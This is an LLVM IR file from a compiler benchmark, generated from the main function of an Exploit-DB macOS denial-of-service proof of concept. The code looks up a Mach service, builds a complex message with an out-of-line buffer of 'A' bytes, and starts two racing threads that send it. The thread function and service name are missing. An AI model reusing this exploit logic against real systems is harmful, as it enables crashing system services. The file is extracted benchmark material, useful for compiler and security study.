; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/macos/dos/extr_40954.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/macos/dos/extr_40954.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.dsmsg = type { i32, %struct.TYPE_8__, %struct.TYPE_7__, %struct.TYPE_6__, %struct.TYPE_5__, i32 }
%struct.TYPE_8__ = type { i32, i32, i32, i64, i8* }
%struct.TYPE_7__ = type { i32, i32, i64 }
%struct.TYPE_6__ = type { i32 }
%struct.TYPE_5__ = type { i32, i32, i64, i64 }

@service_name = common dso_local global i8* null, align 8
@service_port = common dso_local global i64 0, align 8
@KERN_SUCCESS = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [22 x i8] c"unable to look up %s\0A\00", align 1
@MACH_PORT_NULL = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [18 x i8] c"bad service port\0A\00", align 1
@.str.2 = private unnamed_addr constant [10 x i8] c"got port\0A\00", align 1
@MACH_MSGH_BITS_COMPLEX = common dso_local global i32 0, align 4
@MACH_MSG_TYPE_COPY_SEND = common dso_local global i32 0, align 4
@MACH_MSG_PORT_DESCRIPTOR = common dso_local global i32 0, align 4
@MACH_MSG_VIRTUAL_COPY = common dso_local global i32 0, align 4
@MACH_MSG_OOL_DESCRIPTOR = common dso_local global i32 0, align 4
@do_thread = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i64, align 8
  %4 = alloca i8*, align 8
  %5 = alloca %struct.dsmsg, align 8
  %6 = alloca [2 x i32], align 4
  store i32 0, i32* %1, align 4
  %7 = call i32 (...) @mach_task_self()
  %8 = call i32 @task_get_bootstrap_port(i32 %7, i32* %2)
  %9 = load i32, i32* %2, align 4
  %10 = load i8*, i8** @service_name, align 8
  %11 = call i64 @bootstrap_look_up(i32 %9, i8* %10, i64* @service_port)
  store i64 %11, i64* %3, align 8
  %12 = load i64, i64* %3, align 8
  %13 = load i64, i64* @KERN_SUCCESS, align 8
  %14 = icmp ne i64 %12, %13
  br i1 %14, label %15, label %18

15:                                               ; preds = %0
  %16 = load i8*, i8** @service_name, align 8
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str, i64 0, i64 0), i8* %16)
  store i32 1, i32* %1, align 4
  br label %83

18:                                               ; preds = %0
  %19 = load i64, i64* @service_port, align 8
  %20 = load i64, i64* @MACH_PORT_NULL, align 8
  %21 = icmp eq i64 %19, %20
  br i1 %21, label %22, label %24

22:                                               ; preds = %18
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.1, i64 0, i64 0))
  store i32 1, i32* %1, align 4
  br label %83

24:                                               ; preds = %18
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0))
  %26 = call i8* @malloc(i32 1048576)
  store i8* %26, i8** %4, align 8
  %27 = load i8*, i8** %4, align 8
  %28 = call i32 @memset(i8* %27, i8 signext 65, i32 4096)
  %29 = bitcast %struct.dsmsg* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %29, i8 0, i64 96, i1 false)
  %30 = load i32, i32* @MACH_MSGH_BITS_COMPLEX, align 4
  %31 = load i32, i32* @MACH_MSG_TYPE_COPY_SEND, align 4
  %32 = call i32 @MACH_MSGH_BITS(i32 %31, i32 0)
  %33 = or i32 %30, %32
  %34 = getelementptr inbounds %struct.dsmsg, %struct.dsmsg* %5, i32 0, i32 4
  %35 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %34, i32 0, i32 0
  store i32 %33, i32* %35, align 8
  %36 = load i64, i64* @service_port, align 8
  %37 = getelementptr inbounds %struct.dsmsg, %struct.dsmsg* %5, i32 0, i32 4
  %38 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %37, i32 0, i32 3
  store i64 %36, i64* %38, align 8
  %39 = load i64, i64* @MACH_PORT_NULL, align 8
  %40 = getelementptr inbounds %struct.dsmsg, %struct.dsmsg* %5, i32 0, i32 4
  %41 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %40, i32 0, i32 2
  store i64 %39, i64* %41, align 8
  %42 = getelementptr inbounds %struct.dsmsg, %struct.dsmsg* %5, i32 0, i32 4
  %43 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %42, i32 0, i32 1
  store i32 9000, i32* %43, align 4
  %44 = getelementptr inbounds %struct.dsmsg, %struct.dsmsg* %5, i32 0, i32 3
  %45 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %44, i32 0, i32 0
  store i32 2, i32* %45, align 8
  %46 = load i64, i64* @MACH_PORT_NULL, align 8
  %47 = getelementptr inbounds %struct.dsmsg, %struct.dsmsg* %5, i32 0, i32 2
  %48 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %47, i32 0, i32 2
  store i64 %46, i64* %48, align 8
  %49 = getelementptr inbounds %struct.dsmsg, %struct.dsmsg* %5, i32 0, i32 2
  %50 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %49, i32 0, i32 0
  store i32 20, i32* %50, align 8
  %51 = load i32, i32* @MACH_MSG_PORT_DESCRIPTOR, align 4
  %52 = getelementptr inbounds %struct.dsmsg, %struct.dsmsg* %5, i32 0, i32 2
  %53 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %52, i32 0, i32 1
  store i32 %51, i32* %53, align 4
  %54 = load i8*, i8** %4, align 8
  %55 = getelementptr inbounds %struct.dsmsg, %struct.dsmsg* %5, i32 0, i32 1
  %56 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %55, i32 0, i32 4
  store i8* %54, i8** %56, align 8
  %57 = getelementptr inbounds %struct.dsmsg, %struct.dsmsg* %5, i32 0, i32 1
  %58 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %57, i32 0, i32 0
  store i32 4096, i32* %58, align 8
  %59 = getelementptr inbounds %struct.dsmsg, %struct.dsmsg* %5, i32 0, i32 1
  %60 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %59, i32 0, i32 3
  store i64 0, i64* %60, align 8
  %61 = load i32, i32* @MACH_MSG_VIRTUAL_COPY, align 4
  %62 = getelementptr inbounds %struct.dsmsg, %struct.dsmsg* %5, i32 0, i32 1
  %63 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %62, i32 0, i32 2
  store i32 %61, i32* %63, align 8
  %64 = load i32, i32* @MACH_MSG_OOL_DESCRIPTOR, align 4
  %65 = getelementptr inbounds %struct.dsmsg, %struct.dsmsg* %5, i32 0, i32 1
  %66 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %65, i32 0, i32 1
  store i32 %64, i32* %66, align 4
  %67 = getelementptr inbounds %struct.dsmsg, %struct.dsmsg* %5, i32 0, i32 0
  store i32 4096, i32* %67, align 8
  %68 = bitcast [2 x i32]* %6 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %68, i8 0, i64 8, i1 false)
  %69 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 0
  %70 = load i32, i32* @do_thread, align 4
  %71 = bitcast %struct.dsmsg* %5 to i8*
  %72 = call i32 @pthread_create(i32* %69, i32* null, i32 %70, i8* %71)
  %73 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 1
  %74 = load i32, i32* @do_thread, align 4
  %75 = bitcast %struct.dsmsg* %5 to i8*
  %76 = call i32 @pthread_create(i32* %73, i32* null, i32 %74, i8* %75)
  %77 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 0
  %78 = load i32, i32* %77, align 4
  %79 = call i32 @pthread_join(i32 %78, i32* null)
  %80 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 1
  %81 = load i32, i32* %80, align 4
  %82 = call i32 @pthread_join(i32 %81, i32* null)
  store i32 0, i32* %1, align 4
  br label %83

83:                                               ; preds = %24, %22, %15
  %84 = load i32, i32* %1, align 4
  ret i32 %84
}

declare dso_local i32 @task_get_bootstrap_port(i32, i32*) #1

declare dso_local i32 @mach_task_self(...) #1

declare dso_local i64 @bootstrap_look_up(i32, i8*, i64*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #2

declare dso_local i32 @MACH_MSGH_BITS(i32, i32) #1

declare !callback !2 dso_local i32 @pthread_create(i32*, i32*, i32, i8*) #1

declare dso_local i32 @pthread_join(i32, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind willreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
!2 = !{!3}
!3 = !{i64 2, i64 3, i1 false}
